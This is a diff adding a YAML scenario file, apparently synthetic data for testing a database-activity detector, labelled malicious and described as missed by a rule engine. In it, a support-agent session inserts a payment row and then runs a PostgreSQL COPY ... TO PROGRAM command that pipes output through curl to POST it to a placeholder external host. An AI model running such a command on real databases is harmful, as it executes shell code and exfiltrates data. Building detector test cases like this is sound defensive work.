@@ -1,0 +1,23 @@
+scenario_id: gen_ecommerce_84_data_tamper_mal_2517
+family_id: gen_ecommerce_84_data_tamper_mal_fam2517
+domain: ecommerce
+time_of_day: 01:35
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: support_agent
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.5
+  events:
+  - step_id: act
+    sql: INSERT INTO payments DEFAULT VALUES
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://warehouse-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 10.57.35.53
+      port: 8080
